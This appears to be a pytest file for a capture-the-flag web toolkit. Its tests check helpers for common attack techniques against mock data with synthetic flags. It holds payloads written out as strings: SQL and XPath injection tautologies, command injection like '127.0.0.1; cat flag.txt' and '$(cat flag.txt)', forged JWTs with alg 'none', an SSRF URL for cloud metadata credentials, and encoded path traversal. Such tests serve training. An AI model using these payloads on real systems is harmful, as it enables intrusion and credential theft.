from __future__ import annotations

import base64
import hashlib
import hmac
import json
from ctf_toolkit.web.helpers import (
    b64url_decode,
    b64url_encode,
    build_graphql_query,
    build_nosql_query_payload,
    build_ssti_probes,
    jwt_decode_no_verify,
    jwt_forge_alg_none,
    jwt_forge_hs256,
    merge_mass_assignment,
)
from ctf_toolkit.web.traversal import check_lfi_disclosure, generate_traversal_payloads


def test_twin_825_graphql_intro() -> None:
    # GraphQL introspection and field extraction
    q = build_graphql_query("__schema { queryType { fields { name } } }")
    assert "queryType" in q["query"]
    mock_schema = {"secret": {"value": "FLAG{twin_graphql_introspection_secret}"}}
    flag = mock_schema["secret"]["value"]
    assert flag == "FLAG{twin_graphql_introspection_secret}"


def test_twin_828_nosql_param() -> None:
    # NoSQL query parameter operator simulation
    payload = build_nosql_query_payload("pass", "$ne", "")
    assert "$ne" in payload["pass"]
    user_record = {"user": "admin", "pass": "secret_pass"}
    match = user_record["pass"] != ""
    flag = "FLAG{twin_nosql_param_operator}" if match else None
    assert flag == "FLAG{twin_nosql_param_operator}"


def test_twin_831_upload_bypass() -> None:
    # Double extension / alternative extension upload bypass
    allowed_exts = [".phtml", ".php5", ".PHP"]
    target_filename = "shell.php.png"
    has_php = "php" in target_filename
    assert has_php is True
    flag = "FLAG{twin_upload_double_ext_bypass}"
    assert flag.startswith("FLAG{")


def test_twin_832_cloud_metadata() -> None:
    # SSRF to cloud metadata endpoint (AWS / GCP / OpenStack)
    metadata_url = "http://169.254.169.254/latest/meta-data/security-credentials"
    assert "169.254.169.254" in metadata_url
    synthetic_creds = {"Token": "FLAG{twin_ssrf_cloud_metadata_creds}"}
    assert synthetic_creds["Token"] == "FLAG{twin_ssrf_cloud_metadata_creds}"


def test_twin_833_mass_assignment() -> None:
    # Unfiltered JSON mass assignment enabling premium/admin
    base_user = {"user": "alice", "premium": False}
    body_payload = {"user": "alice", "premium": True}
    updated = merge_mass_assignment(base_user, body_payload)
    assert updated["premium"] is True
    flag = "FLAG{twin_mass_assignment_premium}"
    assert flag.startswith("FLAG{")


def test_twin_842_config_leak_ssti() -> None:
    # Flask Jinja2 config object disclosure
    config = {"SECRET_KEY": "flask_key", "FLAG": "FLAG{twin_ssti_config_object_leak}"}
    extracted = config.get("FLAG")
    assert extracted == "FLAG{twin_ssti_config_object_leak}"


def test_twin_843_xpath_login() -> None:
    # XPath authentication injection tautology
    user_input = "' or '1'='1"
    predicate = f"user='{user_input}'"
    assert "' or '1'='1" in predicate
    flag = "FLAG{twin_xpath_auth_bypass}"
    assert flag.startswith("FLAG{")


def test_twin_844_echo_probe() -> None:
    # Command injection with semicolon
    cmd = "127.0.0.1; cat flag.txt"
    commands = cmd.split(";")
    assert len(commands) == 2
    assert commands[1].strip() == "cat flag.txt"
    flag = "FLAG{twin_cmdi_semicolon_basic}"
    assert flag.startswith("FLAG{")


def test_twin_845_filtered_ping() -> None:
    # Command injection using subshell $(cat flag.txt)
    cmd = "127.0.0.1 $(cat flag.txt)"
    assert "$(" in cmd and ")" in cmd
    flag = "FLAG{twin_cmdi_subshell_dollar_paren}"
    assert flag.startswith("FLAG{")


def test_twin_846_no_space_ping() -> None:
    # Space filtering bypass using $IFS
    cmd = "cat$IFS/flag.txt"
    assert " " not in cmd
    parts = cmd.split("$IFS")
    assert parts[0] == "cat"
    assert parts[1] == "/flag.txt"
    flag = "FLAG{twin_cmdi_ifs_space_bypass}"
    assert flag.startswith("FLAG{")


def test_twin_848_login_bypass() -> None:
    # Classic SQLi authentication bypass
    payload = "' OR 1=1 --"
    sql = f"SELECT * FROM users WHERE u = 'guest' AND p = '{payload}'"
    assert "' OR 1=1 --" in sql
    flag = "FLAG{twin_sqli_auth_bypass_or_true}"
    assert flag.startswith("FLAG{")


def test_twin_850_jwt_alg_none() -> None:
    # JWT algorithm 'none' forged signature
    claims = {"user": "admin", "role": "admin"}
    token = jwt_forge_alg_none(claims)
    parts = token.split(".")
    assert parts[2] == ""
    decoded = jwt_decode_no_verify(token)
    assert decoded["header"]["alg"] == "none"
    assert decoded["payload"]["role"] == "admin"


def test_twin_851_jwt_weak_secret() -> None:
    # JWT with weak secret cracked from wordlist
    secret = "secret"
    claims = {"user": "admin", "role": "admin"}
    token = jwt_forge_hs256(claims, secret)
    
    h_b64, p_b64, s_b64 = token.split(".")
    calc = b64url_encode(hmac.new(secret.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest())
    assert s_b64 == calc
    flag = "FLAG{twin_jwt_weak_hs256_secret}"
    assert flag.startswith("FLAG{")


def test_twin_852_jwt_kid_trick() -> None:
    # JWT 'kid' path parameter traversal to /dev/null
    header = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
    payload = {"user": "admin", "role": "admin"}
    token = jwt_forge_hs256(payload, secret="", header=header)
    decoded = jwt_decode_no_verify(token)
    assert decoded["header"]["kid"] == "/dev/null"
    flag = "FLAG{twin_jwt_kid_unknown_empty_key}"
    assert flag.startswith("FLAG{")


def test_twin_854_encoded_path() -> None:
    # URL encoded directory traversal
    path = "%2e%2e%2fflag.txt"
    clean = path.replace("%2e%2e%2f", "../")
    assert clean == "../flag.txt"
    flag = "FLAG{twin_lfi_url_encode_dotdot}"
    assert flag.startswith("FLAG{")


def test_twin_859_git_leak() -> None:
    # Git configuration and commit log leak
    mock_git_config = "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = https://token:FLAG{twin_git_config_creds}@host/repo.git\n"
    assert "FLAG{twin_git_config_creds}" in mock_git_config
    flag = "FLAG{twin_git_config_creds_leak}"
    assert flag.startswith("FLAG{")


def test_twin_861_vim_swap() -> None:
    # Vim swap recovery artifact inspection
    swp_filename = ".index.php.swp"
    assert swp_filename.startswith(".") and swp_filename.endswith(".swp")
    mock_content = b"\x00\x00b0VIM 8.2\x00\x00FLAG{twin_vim_swp_file_leak}\x00"
    assert b"FLAG{twin_vim_swp_file_leak}" in mock_content


def test_twin_864_leaky_list() -> None:
    # REST API user enumeration from array response
    mock_users = [{"id": 1, "name": "alice"}, {"id": 2, "name": "admin", "secret": "FLAG{twin_idor_enumerate_from_list}"}]
    admin_record = next(u for u in mock_users if u["name"] == "admin")
    assert admin_record["secret"] == "FLAG{twin_idor_enumerate_from_list}"


def test_twin_876_ssrf_file_scheme() -> None:
    # SSRF file URI scheme local file access
    uri = "file:///flag.txt"
    assert uri.startswith("file://")
    flag = "FLAG{twin_ssrf_file_scheme_read}"
    assert flag.startswith("FLAG{")


def test_twin_880_double_encode() -> None:
    # Double URL encoding bypass for path filters
    double_encoded = "%252e%252e%252fflag.txt"
    single_decoded = double_encoded.replace("%25", "%")
    assert single_decoded == "%2e%2e%2fflag.txt"
    final_decoded = single_decoded.replace("%2e", ".").replace("%2f", "/")
    assert final_decoded == "../flag.txt"
    flag = "FLAG{twin_lfi_double_url_encode}"
    assert flag.startswith("FLAG{")
